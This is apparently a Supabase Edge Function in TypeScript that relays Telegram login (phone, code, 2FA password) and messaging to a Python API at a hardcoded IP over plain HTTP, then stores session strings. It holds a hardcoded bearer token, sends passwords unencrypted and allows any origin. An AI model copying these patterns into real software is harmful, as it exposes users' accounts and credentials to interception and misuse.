import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
}

interface TelegramApiRequest {
  action: 'send_code' | 'verify_code' | 'get_dialogs' | 'send_message' | 'check_status';
  phone_number?: string;
  code?: string;
  password?: string;
  chat_id?: string;
  message?: string;
  limit?: number;
}

class TelegramApiClient {
  private baseUrl = 'http://85.202.193.46:8000';
  private authToken = 'Alfa2000@';

  async makeRequest(endpoint: string, data: any, method: string = 'POST'): Promise<Response> {
    const url = `${this.baseUrl}${endpoint}`;
    console.log(`Making request to Python API: ${method} ${url}`);
    
    let body: FormData | string;
    let headers: Record<string, string> = {
      'Authorization': `Bearer ${this.authToken}`,
    };

    if (method === 'POST' && endpoint.includes('/auth/')) {
      // Для auth эндпоинтов используем FormData
      body = new FormData();
      Object.keys(data).forEach(key => {
        if (data[key] !== undefined) {
          body.append(key, data[key].toString());
        }
      });
      console.log('Using FormData for auth endpoint');
    } else {
      // Для остальных эндпоинтов используем JSON
      headers['Content-Type'] = 'application/json';
      body = JSON.stringify(data);
      console.log('Using JSON for non-auth endpoint');
    }

    try {
      const response = await fetch(url, {
        method,
        headers,
        body,
      });

      console.log(`Python API response: ${response.status} ${response.statusText}`);
      return response;
    } catch (error) {
      console.error('Python API request failed:', error);
      throw error;
    }
  }

  async sendAuthCode(phoneNumber: string) {
    try {
      console.log(`Sending auth code to ${phoneNumber} via Python API`);
      const response = await this.makeRequest('/auth/auth/request_code', {
        phone_number: phoneNumber
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error(`Auth code request failed: ${response.status} - ${errorText}`);
        throw new Error(`HTTP ${response.status}: ${errorText}`);
      }

      const result = await response.json();
      console.log('Auth code request successful:', result);
      
      return {
        success: true,
        data: result
      };
    } catch (error) {
      console.error('Error in sendAuthCode:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async verifyAuthCode(phoneNumber: string, code: string, password?: string) {
    try {
      console.log(`Verifying auth code for ${phoneNumber} via Python API`);
      const requestData: any = {
        phone_number: phoneNumber,
        code: code
      };

      if (password) {
        requestData.password = password;
        console.log('Including 2FA password in verification');
      }

      const response = await this.makeRequest('/auth/auth/verify_code', requestData);

      if (!response.ok) {
        const errorText = await response.text();
        console.error(`Auth code verification failed: ${response.status} - ${errorText}`);
        
        if (response.status === 422) {
          throw new Error('Неверный код подтверждения');
        } else if (errorText.includes('SESSION_PASSWORD_NEEDED')) {
          return {
            success: false,
            requires_2fa: true,
            error: 'Требуется двухфакторная аутентификация'
          };
        }
        
        throw new Error(`HTTP ${response.status}: ${errorText}`);
      }

      const result = await response.text(); // API возвращает строку
      console.log('Auth code verification successful, session length:', result.length);
      
      return {
        success: true,
        data: result
      };
    } catch (error) {
      console.error('Error in verifyAuthCode:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async getDialogs(limit: number = 10) {
    try {
      console.log(`Getting dialogs (limit: ${limit}) via Python API`);
      const response = await this.makeRequest('/get_dialogs', {
        limit: limit
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error(`Get dialogs failed: ${response.status} - ${errorText}`);
        throw new Error(`HTTP ${response.status}: ${errorText}`);
      }

      const result = await response.json();
      console.log(`Got ${result.length || 0} dialogs from Python API`);
      
      return {
        success: true,
        data: result
      };
    } catch (error) {
      console.error('Error in getDialogs:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async sendMessage(chatId: string, message: string) {
    try {
      console.log(`Sending message to chat ${chatId} via Python API`);
      const response = await this.makeRequest('/send_message', {
        chat_id: chatId,
        message: message
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error(`Send message failed: ${response.status} - ${errorText}`);
        throw new Error(`HTTP ${response.status}: ${errorText}`);
      }

      const result = await response.json();
      console.log('Message sent successfully via Python API');
      
      return {
        success: true,
        data: result
      };
    } catch (error) {
      console.error('Error in sendMessage:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async checkStatus() {
    try {
      console.log('Checking Python API status');
      // Используем рабочий POST эндпоинт для проверки доступности API
      const response = await this.makeRequest('/auth/auth/request_code', {
        phone_number: '+1234567890' // Фиктивный номер для проверки
      });

      console.log(`Python API status check: ${response.status}`);
      
      // Считаем API доступным, если он отвечает (даже с ошибкой валидации)
      return {
        success: response.status < 500, // 4xx ошибки означают что API работает
        status: response.status
      };
    } catch (error) {
      console.error('Error in checkStatus:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }
}

serve(async (req: Request) => {
  // Handle CORS preflight requests
  if (req.method === "OPTIONS") {
    return new Response(null, {
      status: 200,
      headers: corsHeaders,
    });
  }

  try {
    const { createClient } = await import('npm:@supabase/supabase-js@2');
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    const telegramApi = new TelegramApiClient();
    
    if (req.method === "POST") {
      const requestData: TelegramApiRequest = await req.json();
      console.log(`Edge Function received action: ${requestData.action}`);
      
      switch (requestData.action) {
        case 'check_status':
          console.log('Processing check_status action');
          const statusResult = await telegramApi.checkStatus();
          return new Response(
            JSON.stringify(statusResult),
            {
              headers: {
                ...corsHeaders,
                "Content-Type": "application/json",
              },
            }
          );

        case 'send_code':
          console.log('Processing send_code action');
          if (!requestData.phone_number) {
            return new Response(
              JSON.stringify({ success: false, error: "Phone number is required" }),
              {
                status: 400,
                headers: {
                  ...corsHeaders,
                  "Content-Type": "application/json",
                },
              }
            );
          }

          const sendCodeResult = await telegramApi.sendAuthCode(requestData.phone_number);
          return new Response(
            JSON.stringify(sendCodeResult),
            {
              headers: {
                ...corsHeaders,
                "Content-Type": "application/json",
              },
            }
          );

        case 'verify_code':
          console.log('Processing verify_code action');
          if (!requestData.phone_number || !requestData.code) {
            return new Response(
              JSON.stringify({ success: false, error: "Phone number and code are required" }),
              {
                status: 400,
                headers: {
                  ...corsHeaders,
                  "Content-Type": "application/json",
                },
              }
            );
          }

          const verifyResult = await telegramApi.verifyAuthCode(
            requestData.phone_number,
            requestData.code,
            requestData.password
          );

          // Если авторизация успешна, сохраняем сессию в Supabase
          if (verifyResult.success) {
            console.log('Saving session to Supabase');
            const { data: { user } } = await supabase.auth.getUser();
            const userId = user?.id || `anonymous_${Date.now()}`;

            const { error: saveError } = await supabase
              .from('telegram_sessions')
              .upsert({
                user_id: userId,
                phone: requestData.phone_number,
                session_data: {
                  session_string: verifyResult.data,
                  auth_date: new Date().toISOString(),
                  api_type: 'edge_function'
                },
                is_active: true
              }, {
                onConflict: 'user_id'
              });

            if (saveError) {
              console.error('Error saving session to Supabase:', saveError);
            } else {
              console.log('Session saved to Supabase successfully');
            }
          }

          return new Response(
            JSON.stringify(verifyResult),
            {
              headers: {
                ...corsHeaders,
                "Content-Type": "application/json",
              },
            }
          );

        case 'get_dialogs':
          console.log('Processing get_dialogs action');
          const dialogsResult = await telegramApi.getDialogs(requestData.limit || 10);
          return new Response(
            JSON.stringify(dialogsResult),
            {
              headers: {
                ...corsHeaders,
                "Content-Type": "application/json",
              },
            }
          );

        case 'send_message':
          console.log('Processing send_message action');
          if (!requestData.chat_id || !requestData.message) {
            return new Response(
              JSON.stringify({ success: false, error: "Chat ID and message are required" }),
              {
                status: 400,
                headers: {
                  ...corsHeaders,
                  "Content-Type": "application/json",
                },
              }
            );
          }

          const sendResult = await telegramApi.sendMessage(requestData.chat_id, requestData.message);
          return new Response(
            JSON.stringify(sendResult),
            {
              headers: {
                ...corsHeaders,
                "Content-Type": "application/json",
              },
            }
          );

        default:
          console.log(`Unknown action: ${requestData.action}`);
          return new Response(
            JSON.stringify({ success: false, error: "Unknown action" }),
            {
              status: 400,
              headers: {
                ...corsHeaders,
                "Content-Type": "application/json",
              },
            }
          );
      }
    }

    return new Response(
      JSON.stringify({ error: "Method not allowed" }),
      {
        status: 405,
        headers: {
          ...corsHeaders,
          "Content-Type": "application/json",
        },
      }
    );

  } catch (error) {
    console.error("Edge Function Error:", error);
    return new Response(
      JSON.stringify({ 
        success: false,
        error: "Internal server error",
        details: error.message 
      }),
      {
        status: 500,
        headers: {
          ...corsHeaders,
          "Content-Type": "application/json",
        },
      }
    );
  }
});